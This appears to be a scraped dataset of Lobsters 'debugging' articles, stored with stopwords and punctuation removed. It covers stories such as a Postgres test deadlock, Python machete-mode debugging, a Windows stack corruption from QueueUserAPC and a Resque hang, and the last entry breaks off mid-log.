576,Lobsters,debugging,Debugging,A Two Month Debugging Story,https://kev.inburke.com/kevin/a-two-month-debugging-story/,two month debugging story,problem slow test time javascript start looking common tool stubbing system time cause hang many library run test forever turning database logging postgres stuck vacuum happen wood suggested different approach wood posted conclusion available hire,story error caused test fail maybe one one hundred build recently figured happened deployed code fix problem fighting slow test time javascript sail since pretty much day started shyp run test popular ci service take minute run end end pretty slow spend lot time thinking way make faster ensure test clean slate clear database test normally clear table running truncate table cascade unfortunately take slow want run every test would double runtime test suite delete run much faster record table reference table b delete tableb fail since record still point could draw dependency graph table issue deletes correct order seems painful maintain add constraint instead contractor james cropcho found solution disable constraint run delete reenable constraint ran alter table tablea disable trigger delete tablea alter table tablea enable trigger worked month unfortunately occasionally test would time fail second maybe test run would fail timeout normally test fail get back kind error message postgres constraint failure print useful message javascript exception bubble javascript complain unhandled rejection error nt get also observed could happen anywhere nt seem correlate individual test test file start looking long time suspected orm losing kind race callback nt hit deep framework code type problem nt uncommon javascript common tool stubbing system time cause hang many library including express request async bluebird co type issue incredibly difficult debug thing hang fail hit callback virtually insight stack look like callback failed get hit could add consolelog line idea looking furthermore annotating every single library every single query would caused readability problem elsewhere run test forever ci provider let u ssh host enable ssh access build completes nt practical build fails normal approach debugging intermittent test failure run test continuous loop fail inspect test logsssh host look something figured going unfortunately nt triggering often enough either even trigger ci provider shuts ssh access minute nt fast enough noticeinvestigate instead ship whatever log needed artifact test required turning database logging postgres copying log directory artifact get exported database log across multiple container shared filename meant database log first container became available artifact also add unique id log file get exported properly lot step took enough debuggingsetup time procrastinated hoping better stack trace error message might reveal problem would go away postgres setting enabled loggingcollector logstatement logduration log waiting lock deadlocktimeout loglockwaits ensure log one file logrotationsize loglineprefix p c l e q u finally found something log process still waiting accessexclusivelock relation database m detail process holding lock wait queue log process acquired accessexclusivelock relation database m error canceling autovacuum task context automatic vacuum table circletestpublicevents log process acquired accessexclusivelock relation database m look like unbeknownst u autovacuum running background conflicting multistatement alter table query way one waiting complete get deep enough weed postgres blog post find stuck vacuum happen although requires fairly unusual combination circumstance stuck vacuum even lead undetected deadlock situation tom lane recently pointed process cursor open table attempt take exclusive lock table vacuumed exclusive lock request vacuum block one manually cancelled wood unfortunately continued see deadlock case test would continue make background database query reported completion would interact poorly alter table command deadlock leading timeout posted postgresql mailing list alexey bashtanov suggested different approach instead running alter table start transaction defer enforcement foreign key constraint commit way could run delete order still work begin set constraint deferred delete tablea delete tableb commit approach also sped query run versus wood thought nipped bud certainly happy performance improvement unfortunately still seeing timeouts le frequently maybe twice week usually happen inserting record empty table postgres hang second statementtimeout kick postgres kill query fails build message lock sure going pretty uncharacteristic behavior postgres anything particularly crazy query open suggestion posted postgres mailing list get good feedback conclusion amount work gone tracking failure depressing though surprising javascript nt culprit intermittent test failure would nice ci provider way autoenable ssh failed build enabled postgres logging default disabled autovacuum default also recommend adding foreign key constraint make deferrable initially immediate give flexibility pursue strategy like liked read available hire
577,Lobsters,debugging,Debugging,Machete-mode Debugging,http://nedbatchelder.com/text/machete.html,machetemode debugging,actual presentation case double importing case finding temp file creator finding temp file creator case changing syspath adhoc data breakpoints case random different hunting random bug stack ninja,created may presentation gave pycon portland read slide text page watch video open actual presentation browser use right left arrow advance slide python great language love flexibility dynamism discipline use python way similar stricter language build large system successfullybut heart python simpler fluid language sometimes want fluidity usually dynamic typing mean name may value expect language offer access control internals object python let examine change anything program data heap used throughout programall flexibility powerful tool sometimes thing go wrong flexibility come back bite u cause problem debugok python lack rule got u mess let use freedom power figure going solve problemwe look real problem cropped real project debug problem using dirty trick get information need along way examine python mechanism workthese technique use real program temporary hack get tight place jungle machete good way get real work build real paved road sign painted linesideally prevent bad situation happening first place mostly going talk avoid problem lot talk help build properly start talk using python flexible power untangle gotten troubleall code talk meant used discarded served purpose getting information need understand problem deleted hacky wrong levelby way case written detail blog provide link post gocase double importingwe problem module imported since contained class definition meant class defined twice never good idea live situation python complain often cause issue recent version django complain discovered happeningwhen import module py file found executed result become attribute modulemodules executed sysmodules dictionary keep track module imported module imported subsequent import statement simply find module sysmodules return rather executing file againthe first time module imported python find py file module syspath list directory python us look py file directory examined py file file found executed module made result module stored sysmoduleswith machinery ensure file executed imported imported twice could read code use grep look reason one consequence python dynamic nature static analysis like difficultso instead static analysis use dynamic tool let run code get tell u going theme run case look rather try analyze code run code understand itto find problem take advantage fact importing module really executes code module class function defined module class def statement py file executed often easy think module containing class function really executable statement define class functionswhatever code put toplevel module execute module imported special define class function mode import module code really run statement moduleso put code one doubleimported module run twice code put us inspectstack examine current state call stack tell u importing moduleif looked inspect module go take peek lot interesting function getting information kind thing inspectstack return list tuples one frame call stack tuples include name function filename line number list source line around call site great way pinpoint programhere formatting function name file name line number one line compact outputi also opening temporary file output writing result worry whether stdout captured going opening specific file appending sure output goingthis wrong way log care want fiddle right way code temporarythe result look like way formatted stack function name left colon file name line number right case function name useful since looking file importing doublyimported module import statement inside function reported module insteadwith result two file examine last one stack trace secondsummarypy firstadminpyonce looked two import could see wrong slide show simplified version problemin source tree file accessible two different entry syspath asterisk show directory syspath file imported twice projectthingappsfirstmodelspyin one file imported thingappsfirstmodels found via project syspath entry file imported firstmodels found via projectthingapps syspath entry first import created thingappsfirstmodels key sysmodules second import looked key firstmodels find imported file againthe fix choose one style import stick throughout codesome thing took advantage importing module really executes code good practice avoid code sideeffects run import time case exactly neededhardcoding detail simplifies hack wrote directly temp file choosing put code directly module questionwe thing wrong like since code deleted given u answer need anywaycase finding temp file creatorsmany test create temporary file directory good test properly clean end test run way using unittest write test definitely use addcleanup much better teardown bad test cleaning temporary file directory finding test difficult written simply example temporary created helper function making harder find place temporary made cleaned upwe want information creates file one way would note name temporary file created along call stack made test suite finish could look name marooned file see came fromi took different approach since care file remain test done write information need file write data content file since content used test file name essentially arbitrary anyway write information thereto anything special creation temporary file monkeypatch function tempfile module monkeypatching colorful name changing someone else code runtime injecting code namespacefor example change mkdtemp work define function calling signature assign tempfilemkdtemp unsuspecting product code call tempfilemkdtemp actually running function rather code standard librarythis work name special python mkdtemp ordinary attribute tempfile module reassigned name may seem odd standard library feel like unchanging rock build program standard library made python module like code name reassignedmonkeypatching powerful since hijack name part program using also dangerously chaoticone thing tricky get right monkeypatching exactly patch case handful different tempfile function could involved want take entire function want change name file getreading source tempfilepy turn function create temporary file directory make use helper getcandidatenames function generates sequence possible file name responsible typical random name see temporary file function try name turn looking one already usedif monkeypatch getcandidatenames killed two bird one stone centrally affect function create temporary file affect file name create create file detail returnanother factor complicates monkeypatching patch function get called might also need patch function imported depending imported effective monkeypatch want run patching code code programideally way run monkeypatch main program python feature running preamble real program luckily way sneak code startup interpreterone way installed package referenced pythonspecific form symbolic link called pth file small file usually contain name another directory include searching packagesbut line pth file begin import line executed use along knowledge code imported module truly executed get code run early possible programwe create file called firstthingpy put code want run first thing create file sitepackages directory called import firstthing name file pth file processed alphabetically name ensure code run even pth file processednow way run code startup patch define mygetcandidatenames yield possible name temporary file save original getcandidatenames function use part function function us old friend inspectstack concatenating last source file name line number something compact enough fit file namewe monkeypatch tempfilegetcandidatenames tempfile function make temporary file stack trace file nameslessons read standard library simple fact sometimes overlooked even get monkeypatching able read standard library code powerful way able understand happening programyou patch standard library mostly python code like anything else change work get leverage thorny problem real code emergency helpful pth file normally small invisible part python installation use inject code startup time used clever trick writing information name temporary file often debugging large system part accessible like think creatively information need put see wellmore detail case blog post finding temp file creatorscase changing syspath one point test suite failing wrong module imported import xblock intending find appsxblockpy importing libxblockpy instead lib path imported examining syspath import happening adding print statement import new incorrect entry added syspath put already knew syspath manipulation proud maybe others find check source proved thirdparty code must fault grep thirdparty module using find culprit would great way break debugger certain piece data changed case incorrect entry syspath added first element ended lib want stop debugger condition true syspath endswith lib standard python debugger pdb feature set breakpoint particular line condition wanted condition untethered line source code wanted stop debugger condition became true matter line code runningpython debugger tool like coverage measurement built feature called trace function python function called every line running program every time new line executed trace function called track program progresssince condition simple easy write trace function want check condition true break debugger def trace frame event arg syspath endswith lib pdbsettrace return tracesyssettrace trace honest sure would happen tried start debugger inside trace function seemed particularly twisty trace function simple enough write try figured give shot classic machetemode style good chance work easy tryit worked great trace function place test suite ran really slowly revealed test runner nose adding entry syspath little investigation revealed configurable easy u disablelessons problem might code everything running together one process python provide access control class code misbehaving surprising placesdynamic analysis powerful rather use static analysis like grep though feel funny bestow fancy term good old grep coming dynamic point view found u answer quickly want know changing data watch datapython big hammer trace function observe entire program running linebyline modify value even change line run next underpins every debugger whatever debugger domore detail case blog post adhoc data breakpointscase random different run python code part presenting problem student randomize component question different student get different problem seed random number generator studentspecific seed student revisits problem see problem timewe seeing first time problem generation ran would get one set value subsequent run would get different consistent valuesthe first different rest factor made think something happening import remember module executed first imported subsequent import use stored module objectthere two way random sequence could changing either something reseeding random number generator something eating random number sequencea little experimentation interactive interpreter showed one value consumed sequence use monkeypatching find problem time though instead providing useful new implementation function planting booby trapwe replace randomrandom function raise exception called run code examine traceback see consuming random numberthe code simple dividing one zero raise zerodivisionerror extremely handy easy drop code want see executes zerodivisionerror raise unlikely exception sure yourshere run code oneoverzero find problem quickly one thirdparty library importing testcase code constructor default argument random value default value evaluated function defined randomrandom call happened importthis library extra bonus default value never used constructor always called explicit value argumentlessons exception good way get information deep inside program another trick raise exception data messagedon afraid blow thing case monkeypatch destroys program give u useful informationsome technique require bit luck offending call random first one found booby trap stop program first callavoid mutating globals one cause problem code thirdparty code using single global random number sequence sharing global mutable state best solution problem create private random instance use could sure getting number sequence seededa common mistake debugging program assume something else fault compiler helper library anything usually wrong usually code blame sometimes really someone else faultmore detail case blog post hunting random bugwhen program misbehaving need get information happening thing wrong temporarily get need clean afterwardsall technique dynamic analysis getting information actually running code cut dynamism hard analyze staticallyunderstanding python work give leverage problem like help find technique solve themby way liked case might also like blog post stack ninja us similarly subversive techniquesthanks attention hope helpful
578,Lobsters,debugging,Debugging,How big an issue is the nausea problem for Virtual Reality products?,https://www.quora.com/How-big-an-issue-is-the-nausea-problem-for-Virtual-Reality-products,big issue nausea problem virtual reality product,,please enable javascript refresh page continue
580,Lobsters,debugging,Debugging,A Regex Debugger,http://eigenstate.org/notes/regex-debug,regex debugger,debugging regexes myrddin documented myrddin reference page understanding output getting code myrddin documented api reference library implementing debugger execution trace failure success conclusion,debugging regexes people confronted problem think know use regular expression two problem jwz regexes sometimes cryptic difficult understand top regex fails regex implementation rarely give feedback figure spent suboptimal portion life staring bemusedly regexes nt quite right decided write small hack fix annoyance since regex implementation kicking around myrddin decided instrument make tool would make easier see regexes failed pattern input run press run see output regex dialect used documented myrddin reference page understanding output describing work going go example dump used debug thing going ignoring fundamental rule validating email address regex nt running broken email regex redump comorgnet redump sit waiting text match stdin let type email match expectation valid emailorg matched valid emailorg group org coverage comorgnet tell u pretty clearly string matched group selected org since parenthesized section also show coverage regex word part regex passed order match string case covered clause final selection final match included com hand regex fails match also get indicator showing regex failed making far easier figure failed thingything hotmailcom match failed comorgnet thingything hotmailcom something universityedu match failed comorgnet something universityedu tell u string regex failed well regex example input thingything hotmailcom regex failed matching pattern failure immediately ah pattern failing first section pattern nt contain second input fails edu string net pattern highlighting source failure quickly easily showing farthest mismatch string note current implementation coverage printing single clause one caret printed even span multiple character therefore passed az would mark coverage az instead az restriction current way debug information regex recorded probably difficult fix getting code redump built top myrddin regex library result shipped myrddin programming language dialect regex implemented documented api reference library code life http githubcomoridbmcblobmasterlibregexredumpmyr implementing debugger execution trace regex engine using implemented relatively simple nfa virtual machine walk set instruction either matching instruction dying example regex abc generate following code dumped redump v abc ilbra ibyte ibyte b ibyte c irbra imatch regex start instruction ilbra mark start capture group capture whole expression next three instruction fail match next byte pattern followed b c next irbra instruction close match group started ilbra recording capture group finally imatch end expression successfully pretty boring example interesting regexes like b compiles something like ilbra ifork ibyte ijmp ibyte b irbra imatch structure look pretty similar couple interesting instruction ifork split execution stream effectively branching way executing regex program aab succeed giving following execution trace red square indicate failed attempt matching final green square indicates successful match however run aacdef first mismatched character c cause final thread exit since match neither live thread failure want know regex failed last thread alive interesting one simply mapping final program counter offset regex sufficient know regex failed enough fidelity enable debugging support debugging regex parser compiler needed instrumented keep track node ast generated could mapped back offset within pattern debug information stored along side regex pulled redump formatting output offset ilbra start offset ifork offset ibyte offset ijmp offset ibyte b b offset irbra nt care offset imatch nt care much know match regex failed failed pattern came success often confusing trying sort regex failed succeeded bug pattern allow essential portion skipped portion may capture much data coming useful method debugging successful match slightly trickier think coverage solution presented good job making easier understand pattern matched debug information needed generating coverage info superset information needed debug failure addition knowing farthest pc thread full trace state hit needed recorded regex execution perthread bit set instruction pointer indexed thread id step advanced instruction recorded winning thread stored end regex execution finally success recorded set hit location generated mapping instruction pointer regex offset printing caret every regex offset hit one problem coverage information used purpose currently pc map single point rather range cause loss fidelity reason coverage caret show start multi character entity fixing bug would involve bit extra book keeping fixable conclusion regexes debuggable use code want learn regexes work detail suggest reading rus cox excellent series http swtchcomrscregexp
582,Lobsters,debugging,Debugging,STRIKE-OTR - How implementing the new OTR protocol fixed a bug in the previous one,http://blog.torchz.net/2015/09/22/strike-otr.html,strikeotr implementing new otr protocol fixed bug previous one,bug fixed specific finitestate analysis update spec,implementing new otr protocol fixed bug previous one latest week group thoughtworks named strike working new implementation otr offtherecord version protocol security layer widely used xmppbased communication tool week work achieved new lib golang also fixed bug previous one choose golang platform memorysafe easy start existing implementation otr golang version without support multiple instance tag multidevices usage started reading specific bunch investigation old golangotr official libotr implemented c development outstanding feature otr called forward secrecy mean lose control private key previous conversation compromised thus requires otr implementation enforce memory forget previous key refreshed development picked existing version talk new implementation carefully checked difference golangotr clibotr serveral difference since golangotr simplified implementation excuse security bug could lead larger leak fixed test coverage enough old implementation test driven development project ensure code quality running aganst reveal key feature print enough test data found branch never covered actually reached case behaves different understanding spec investigation wrote test expose problem easily thus found way fix bug existing implementation save field keyslot caused cache miss every calcdatakeys also caused rotate key function find mac key revealed also stop revealing sending mac key finitestate analysis otr spec revealed attack message integrity sending mac key revealed spec updated accordingly according change spec take receiving mac key take mac key actually used verify mac message mean dh key rotated cache receiving mac key keyslot later enforce revealing mac key next reveal step fixed finitestate analysis spec
583,Lobsters,debugging,Debugging,Understanding Half-Pixel and Half-Texel Offsets,http://drilian.com/2008/11/25/understanding-half-pixel-and-half-texel-offsets/,understanding halfpixel halftexel offset,coordinate space texture sampling pixel coordinate weird unintuitive weird pixel center msaa light prepass rendering great reference handle case take u home article directly mapping texels pixel coordinate system,using xna safely ignore post opengl immune particular oddity however likely deal dreaded halftexel offset today know many year using came realize really understand source issue sort gotten handle figured post super new journal consider test run coordinate space first thing note basic coordinate space going referring texture space clip space lot thought quick refresher mean mostly make sure thinking terminology using clip space postprojection halfcube space x z x far left edge screen x far right edge bottom edge top z near near plane z far far plane texture space area u v texture map making single endtoend repeat texture represents upperleft coordinate texture lowerright simplification ignore z direction clip space since article really screenspace aspect texture sampling texture sampling pretty straightforward diagram future diagram using texture range x map exactly range texture note center upperleft texel lie instead refers upperleft corner texel important thing using bilinear filtering want sample color data single texel need sample center texel instead corner sample halftexel texel want sample texel width texture space texel texture space half side effect bilinear sampling wrapping sampling along left edge give exactly data sampling along right edge coordinate case get perfect blend texels either end texture true border texels general sampling dot image way get pure sample texel bilinear filtering anywhere else blend two edge line two texels neighboring edge weighted evenly upshot official center texel located center half texel edge however see moment rule sampling texels apply pixel pixel coordinate weird unintuitive referring pixel coordinate v texel coordinate pixel coordinate lack better way explain coordinate used rendering screen render target pixel destination coordinate clip space come render geometry go gauntlet matrix ending projection matrix end clip space x visible area screen diagram way clip space map pixel note upperleft clip space coordinate actually right pixel center root cause whole offset problem basically say screensized texture draw screen using fullscreen quad clip space upperleft lowerright upperleft pixel would sample upperleft corner quad would give texture coordinate remember center texel actually upperleft corner texel bilinear filtering instead getting pure sample texture perfect blend surrounding texels simpler term halfpixelhalftexel offset exists discrepancy center pixel center texels computed fix could simply offset texture coordinate halftexel sampling shader get uv coordinate add half texel example sampling would give perfectly linedup texture sample get great mapping pixel texels however another problem happens using multisample antialiasing msaa weird pixel center msaa know center origin pixel actually upperleft coordinate clip space cause problem msaa turned msaa geometry sampled multiple time per pixel using set point exist within pixel square pixel really square point sample within square msaa effectively treat pixel multiple sample square important aside msaa texture still sampled pixel center msaa affect uv coordinate get given pixel merely affect geometry coverage continuing example hypothetical simple msaa strategy wherein pixel sampled four time msaa aligned grid diagram illustrates issue standard full screen quad choice pixel center msaa even fullclipspace thus traditionally fullscreen quad along top left edge sample longer touch quad thus edge entirely filled pure white quad drawn render target cleared black would grey edge along top left likely seen ton game turn fullscreen antialiasing weird line side screen fadeout like pixel offset problem rearing head fix turn simple drawing fullscreen quad instead adding halftexel uv coordinate instead subtract halfpixel position uv coordinate shift quad lie perfectly within grid diagram every msaa sample hit geometry added bonus mean uv sample get already texel center adding halftexel required note say subtract halfpixel position mean move position quad one halfpixel towards upperleft actually add reason sign moving left postprojection space x left reason instead clip space coordinate range width width like texture need double movement account course drawing world geometry using screen coordinate index texture map like instance using light prepass rendering still want add halftexel instead fact great reference handle case take u home article halftexelhalfpixel offset bizarre feature extension xna order properly handle using fullscreensized texture rendering fullscreen otherwise screenaligned quad subtract halfpixel size output vertex position vertex shader ensure texel center line pixel center proper texture sampling quad play nice along left top edge screen msaa rendering normal geometry geometry already proper place ie already play fine msaa consequently add halftexel uv coordinate fullscreen sample allow sample texel center desired article refers mostly fullscreen effect information generally useful downsampling texture need know sample point source texture actually hit rendering want bilinear filtering instance average downsample hopefully confused halftexel offset help clear thing additional reference msdn directly mapping texels pixel coordinate system
584,Lobsters,debugging,Debugging,Learning From Your Bugs,https://henrikwarne.com/2016/04/28/learning-from-your-bugs/,learning bug,example work lesson coding testing debugging benefit antifragile agree completely like,bug great learning opportunity make sure learn much possible bug fix method used year write short description bug fix lesson learned way back came across blog post unfortunately find described method used ever since believe helped become better software developer every time fix particularly tricky interesting bug take minute write fact example typical entry example date symptom infinite loop decoding message cause unknown element id found message try skip reading length advancing po pointer many byte however case length zero causing u try skip element id found happened parsing setup message taken ethereal trace nortel message byte long included lot fast start element msgmaxlen normally receive truncated message commoncommunicationcxx fed directly parsed memory past end array accessed happened zero exposing problem find added print out parsing code lucky data happened zero fix length given zero set one way always move forward fixed file caused yes time taken resolve bug hour lesson trusted data received incoming message giving huge number cause problem indicating length zero could bad work plain text file called bugstxt top file template heading information filled add new entry copy template section paste template go fill information field shown example selfexplanatory important note bug tracker add bug fix example forgot add statement code soon try realize problem add entry bug fix debugging particularly interesting add new entry usually caused bug occasionally especially hunting difficult bug many day add entry even cause bug fixed first reflex breathe sigh relief move however try write entry immediately fixed detail still fresh mind waiting make much harder remember exactly happened forget write entry far entry come one new entry month average important section lesson requires introspection made bug special found lesson usually come three different area coding mistake make code forget elsepart system call failed response checked adjust coding avoid problem future testing sometimes clear bug caught testing testing point unit functional system test case missing debugging could sped finding bug right tool assume much need better logging code benefit book antifragile nassim nicholas taleb writes error rich information agree completely bug help u understand system better indicate improve coding testing debugging technique think natural try learn much possible writing entry bug file interesting bug find learn much easily something act writing make think deeply happened also written go back afterwards check happened also browse file reading lesson section reinforce thought valuable lesson bug adding entry bug file year long time still help improve developer try see work like like loading related
585,Lobsters,debugging,Debugging,Debugging memory corruption: who the hell writes “2” into my stack?!,http://blogs.unity3d.com/2016/04/25/debugging-memory-corruption-who-the-hell-writes-2-into-my-stack-2/,debugging memory corruption hell writes stack,hi name tautvydas software developer unity working window team like share story debugging elusive memory corruption bug select virtualprotect aslr select select select select wspselect ntdeviceiocontrolfile statustimeout hit like ton brick queueuserapc,hi name tautvydas software developer unity working window team like share story debugging elusive memory corruption bug several week ago received bug report customer said game crashing using scripting backend qa verified bug assigned fixing project quite big although far largest one took minute build machine instruction bug report said play game minute crash sure enough following instruction observed crash fired windbg ready nail unfortunately stack trace bogus k childsp retaddr call u memory access error u clearly tried executing invalid memory address although stacktrace corrupted hoping part whole stack got corrupted able reconstruct look memory content past stack pointer register surely enough gave idea look next dp rsp ucrtbased thminkernelcrtsucrtsrcappcrtheapdebugheapcpp unityplayer std vectoralloc std vecbasetypes o pollrequest std allocator o pollrequest c program file microsoft visual studio ucrtbased thminkernelcrtsucrtsrcappcrtheapdebugheapcpp ucrtbased thminkernelcrtsucrtsrcappcrtheapcalloccpp unityplayer o socketimpl c unityplayer o socket c unityplayer vm socketpollingthread c unityplayer vm c unityplayer vm unityplayer vm freethreadhandle c unityplayer vm unityplayer o thread c unityplayer vm unityplayer vm socketpollingthreadentrypoint c unityplayer vm unityplayer o c unityplayer o thread runwrapper c unityplayer o threadstartwrapper c ntdll basethreadinitthunk rough reconstructed stacktrace ucrtbased ucrtbased ucrtbased unityplayer o socketimpl unityplayer o socket unityplayer vm socketpollingthread unityplayer vm unityplayer o thread unityplayer o ntdll alright knew thread crashing runtime socket polling thread responsibility tell thread socket ready send receive data go like fifo queue socket poll request get put thread socket polling thread dequeues request one one call select function select return result queue callback original request thread pool somebody corrupting stack badly order narrow search decided put stack sentinel stack frame thread stack sentinel defined constructed would fill buffer destructed would check value change worked incredibly well game longer crashing asserting instead somebody touching sentinel private definitely friend ran couple time result every time value written buffer first looking memory view noticed saw familiar exact value seen first corrupted stack trace realized whatever caused crash earlier also responsible corrupting stack sentinel first thought kind buffer overflow somebody writing outside local variable bound started placing stack sentinel much aggressively almost every function call thread made however corruption seemed happen random time able find causing using method knew memory always getting corrupted one sentinel scope somehow needed catch thing corrupts red handed figured make stack sentinel memory read duration stack sentinel life would call virtualprotect constructor mark page read call destructor make writable surprise still corrupted message debug log memory corrupted readonly got corrupted crashinggameexe triggered breakpoint red flag somebody corrupting memory either memory read set read since got access violation assumed latter changed code check whether memory content changed right setting magic value theory checked memory corrupted crashinggameexe triggered breakpoint point thinking well must another thread corrupting stack must right right way knew proceed investigating use data memory breakpoints catch offender unfortunately watch four memory location time mean monitor byte area getting corrupted kb somehow needed figure set breakpoints started observing corruption pattern first seemed random merely illusion due nature aslr every time restarted game would place stack random memory address place corruption naturally differed however realized stopped restarting game every time memory became corrupted continued execution led discover corrupted memory address always constant given debugging session word corrupted would always get corrupted exact memory address long terminate program memory corrupted crashinggameexe triggered breakpoint memory corrupted crashinggameexe triggered breakpoint set data breakpoint memory address watched kept breaking whenever set magic value figured going take visual studio actually allows set condition breakpoint break value memory address minute later breakpoint finally hit arrived point time day debugging thing going triumph finally pinned proclaimed optimistically thought watched debugger disbelief mind got filled question answer even possible going crazy decided look disassembly sure enough modifying memory location writing looking memory window whole region already corrupted ready bang head wall called coworker asked look whether missed something obvious reviewed debugging code together find anything could even remotely cause weirdness took step back tried imagining could possibly causing debugger break thinking code set value came following hypothetical chain event mov byte ptr rax modifies memory location cpu break execution let debugger inspect program state memory get corrupted something debugger inspects memory address find inside think changed change memory content program frozen debugger far know possible scenario either another process o kernel investigate either conventional debugger work enter kernel debugging land surprisingly setting kernel debugging extremely easy window need machine one debugger run one debug open elevated command prompt machine going debugging type host ip ip address machine debugger running use specified port debugger connection anywhere hitting enter second command tell secret key truncated picture act password connect debugger completing step reboot computer open windbg click file kernel debug enter port key everything go well able break execution pressing debug break work debugee computer freeze enter g continue execution started game waited break could find address memory get corrupted memory corrupted crashinggameexe triggered breakpoint alright knew address set data breakpoint configure kernel debugger actually set kd process sessionid cid peb parentcid dirbase objecttable handlecount image crashinggameexe kd process need continue execution press g contextto switched debugger break inthe new process contextkd gbreak instruction exception code first chance nt dbgbreakpointwithstatus cc int processimplicit process reload fkd ba w c char k else gc time breakpoint actually childsp retaddr call nt nt nt cccccccccccccccc unityplayer stacksentinel alright going sentinel happily setting magic value hardware interrupt call completion routine writes stack wow okay reason window kernel corrupting memory first thought u calling window api passing invalid argument went socket polling thread code found system call calling select function went msdn spent hour rereading doc select rechecking whether everything correctly far could tell really much could wrong definitely place doc said pas parameter write stack seemed like everything right running thing try decided step select function debugger step disassembly figure work took hour managed seems select function wrapper wspselect roughly look like auto completionevent tlsgetvalue msafdsocktlsslot setting iostatusblock statusblock auto result ntdeviceiocontrolfile networkdevicehandle completionevent nullptr nullptr statusblock buffer bufferlength buffer bufferlength result statuspending waitforsingleobjectex completionevent infinite true convert result return important part call ntdeviceiocontrolfile fact pass local variable statusblock parameter finally fact wait event signalled using alertable wait far good call kernel function return statuspending complete request immediately case wspselect wait event set ntdeviceiocontrolfile done writes result statusblock variable set event wait completes wspselect return iostatusblock struct look like typedef struct iostatusblock union ntstatus status pvoid pointer ulongptr information iostatusblock piostatusblock struct byte long caught attention struct seems match memory corruption pattern first byte get corrupted ntstatus byte long byte get skipped paddingspace pvoid finally get corrupted indeed written memory first four byte would contain result status first corruption byte always happens error code statustimeout would sound theory wspselect wait ntdeviceiocontrolfile complete figuring select function worked decided look big picture socket polling thread worked hit like ton brick another thread push socket processed socket polling thread socket polling thread call select function since select blocking call another socket pushed socket polling thread queue somehow interrupt select new socket get processed asap one interrupt select function apparently used queueuserapc execute asynchronous procedure select threw exception unrolled stack u execute code point future kernel would complete work write result statusblock local variable longer existed point time happened hit return address stack crash fix pretty straightforward instead using queueuserapc create loopback socket send byte time need interrupt select path used posix platform quite used window fix bug shipped unity one bug keep night took day solve probably one hardest bug ever look fix lesson learnt folk throw exception asynchronous procedure inside system call
587,Lobsters,debugging,Debugging,How I hunted the most odd ruby bug,http://blog.arkency.com/2016/04/how-i-hunted-the-most-odd-ruby-bug/,hunted odd ruby bug,hunted odd ruby bug hunting entirely different beast business background nature industry time time spike sale ton thing happen background even processing job fast enough handle next spike yet everything appeared slow slow confirming problem resque investigating issue could find anything like point noticed one pattern even edited gem production produce much log digging honeybadger code reading honeybadger codebase used inside method epiphany still could find ruby code would actually wait thread everything pointed something indeed wait bring ruby witness problem reproduced hotfixing honeybadger resque ruby team result spectacular effect learn rail book interesting well responsible rail resource,hunted odd ruby bug every come bug programmer life different anything else encountered far last time day debugging find mysql returning incorrect result much fix removed index created scratch problem gone year ago last week hunting entirely different beast dive detail let tell bit business story behind business background working ticketing platform sell ticket big event festival also smaller gig nature industry time time spike sale organizer open sale hot ticket early bird discount promotion probably attended conference concert know work application ton thing happen background especially sale want sale extremely quick handle spike nicely without hiccup purchase finalized background job maybe even responsible generating pdfs ticket responsible delivering email receipt communicate party apis responsible delivering additional service buyer let show sale spike look like effect number queued job notice even processing job fast enough handle next spike organizer event still selling time platform normal hour digging job sometimes even spike job slowly obviously happy performance know codebase know many background job almost nothing sql query decide given sale related sale related need something take long time often quit quickly also machine resque worker running technically process handling load job yet everything appeared slow slow gut feeling hidden problem missing something started investigating confirming problem logged utility machine simply checked htop process load etc load often cpu machine resque job running moment processing like crazy thousand queued job sounded ridiculously low started watching resque log show job taken done able see job processed normally one one moment later thing stopped job done next job taken started looked tree process server could clearly see master resque process still waiting child even though child already reported job done child processing job master process waiting child finish ruby thread master ruby process trolling htop output use shifth disable viewing thread htop future took long time understand going parent child process additional thread honeybadger new relic let reiterate confirmed problem child process finished job according resque log master process still waiting child process die must know resque forking child process every job waiting die starting next job queue related part code resque def work interval block interval float interval resque starting startup loop break shutdown paused job reserve log got jobinspect jobworker self workingon job procline processing jobqueue since timenowtoi jobpayloadclassname child fork job srand reseeding procline forked child timenowtoi begin processwaitpid child rescue systemcallerror nil end jobfail dirtyexitnew tos signaled else investigating issue hard started adding log statement production resque gem see going found nothing really interesting able see child process job started firing atexit hook still hanging used strace see going process nothing later helpful futex futexwaitprivate null futex futexwakeprivate rtsigaction sigint sigign sarestorersasiginfo sarestorersasiginfo rtsigaction sigint sigdfl sarestorersasiginfo sigign sarestorersasiginfo close close close close close close close close close close close close close close close close open devnull ordwrocloexec close write shutdown shutrdwr enotsock socket operation nonsocket close close close close close close close close open devnull ordwrocloexec close write shutdown shutrdwr enotsock socket operation nonsocket close close write munmap exitgroup also used gdb attach process thread apply backtrace able see thread thread lwp poll threadtimer startthread clone thread thread lwp pthreadcondtimedwait nativecondtimedwait nativesleep sleeptimeval rbfsleep vmcallcfuncwithframe vmcallgeneral vmexeccore vmexec loopi rbfloop vmcallcfuncwithframe vmcallgeneral vmexeccore vmexec invokeblockfromc vminvokeproc rbvminvokeproc startthread clone thread thread lwp pthreadcondwait nativecondwait nativesleep rbthreadterminateall rubycleanup rubyrunnode main based main thread assumed main thread apparently thread rbthreadterminateall looked interesting could google anything useful internal ruby method sure two thread gem would use able figure later one trick configinitializersresquerb resqueafterfork atexit threadlisteach resqueloggerinfo tbacktracejoin n end end gave backtrace block level top required block level top required select waittorun runonce run createandruneventloop block level deferredwork disablealltracing block deferredwork catcherrors deferredwork block startworkerthread call block create sleep work block run loop run block level start two potential candidate investigate new relic honeybadger grepped codebase thread sleep atexit threadjoin investigated code around trying find could race condition situation main ruby thread atexit callback would call threadjoin wait honeybadger new relic thread responsible either collecting sending data could find anything like configured new relic honeybadger gem work debug mode one machine watching log trying figure something odd moment saw resque nothing job done easy task occurences donothing period quite random sometimes able spot job done time process job problem appear also easy spot kind similarity point noticed one pattern previous log listing show contain honeybadger problem occured looked like backtrace block level top required block level top required select waittorun runonce run createandruneventloop block level deferredwork disablealltracing block deferredwork catcherrors deferredwork block startworkerthread call block create decided focus effort looking honeybadger log codebase still could find would anything threading related honeybadger cause issue paid attention log even edited gem production produce much log noticed something log looked like everything went fine line number might reflect codebase added debugging statement one line highlighted convinience starting agent block start agent discarding trace featuretraces trace stopping agent stop cleared pid stop killed thread stop stopping agent ensure run flushed trace stop flushed metric stop shuutting worker notice block stop shut worker notice block stop shuutting worker trace block stop shut worker trace block stop shuutting worker metric block stop shut worker metric block stop compare starting agent block start agent discarding trace featuretraces trace stopping agent stop cleared pid stop killed thread stop flushed trace stop flushed metric stop shuutting worker notice block stop shut worker notice 